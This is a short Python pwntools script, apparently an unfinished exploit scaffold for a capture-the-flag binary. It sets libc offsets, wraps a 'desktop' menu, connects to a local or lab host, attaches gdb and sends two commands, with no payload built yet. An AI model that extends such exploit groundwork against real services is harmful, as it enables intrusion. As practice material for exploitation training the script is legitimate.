from pwn import *
from struct import pack,unpack
import time
offset = 0xdaf50 - 0x3f820 #0x7ff5cd3e7860 -  0x7ff5cd342640
offset_str = 0x3f820 - 0x163c78 #0x0000000000046640 - 0x000000000017CCDB 
def create_desktop(name,description,width,height):
	print s.sendlineafter('$','desktop create')
	print s.sendlineafter('Name: ',name)
	print s.sendlineafter('Description: ',description)
	print s.sendlineafter('Width: ',width)
	print s.sendlineafter('Height: ',height)

def destroy_desktop():
	print s.sendlineafter('$','desktop destroy')

def send_option(data):
	print s.sendlineafter('$ ',data)

s = tubes.remote.remote('127.0.0.1', 4444)
#s = tubes.remote.remote('172.16.13.1',20003)
gdb.attach(s, ''' b  *0x40655c
		display /i $pc''')
send_option('switch desktop')
send_option('open owl')

s.interactive()
